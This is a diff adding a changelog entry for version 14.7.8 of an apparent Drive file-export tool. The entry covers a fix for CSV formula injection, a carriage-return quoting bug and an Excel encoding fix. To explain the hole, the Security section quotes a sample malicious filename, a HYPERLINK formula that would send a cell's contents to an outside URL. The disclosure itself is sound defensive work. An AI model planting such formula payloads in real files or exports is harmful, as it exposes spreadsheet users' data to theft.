@@ -8,6 +8,36 @@ and the project aims to follow [Semantic Versioning](https://semver.org/).
 > The detailed, original per-version notes are archived in
 > [`docs/changelog/`](docs/changelog/). This file is the consolidated summary.
 
+## [14.7.8] - 2026-09-15
+
+### Security
+
+- **CSV export was open to formula injection** (#93, CWE-1236). Every cell the
+  export writes is a Drive filename or folder path — text someone else may have
+  chosen, since files and folders shared into your Drive carry the sharer's
+  names. A file called `=HYPERLINK("https://…"&A1,"Open me")` became a live,
+  clickable formula in the spreadsheet of whoever opened the export. Quoting
+  did not help and never could: a quoted formula is still a formula. Cells
+  beginning `=`, `+`, `-`, `@`, tab or CR are now prefixed with `'`, while
+  plainly numeric values are left alone so a negative number is not mangled
+  into text.
+
+### Fixed
+
+- **A carriage return in a filename corrupted the export from that row on.**
+  `\r` was missing from the quoting condition, so one record became two with
+  the wrong column counts, and every value after it landed under the wrong
+  header. Records are now separated by CRLF, as RFC 4180 specifies.
+- **Excel opened every non-ASCII filename as mojibake.** The blob said
+  `charset=utf-8`, but Excel reads a byte-order mark, not the MIME type. The
+  CSV now starts with one — which for a photo library is most of the names.
+
+### Changed
+
+- `itemsToCsv` and `csvCell` are exported and tested. `itemsToCsv` writes the
+  file and was the one part of `js/exporter.js` with no test coverage at all;
+  `test/exporter.test.js` covered `buildExportItems` only.
+
 ## [14.7.7] - 2026-09-14
 
 ### Fixed
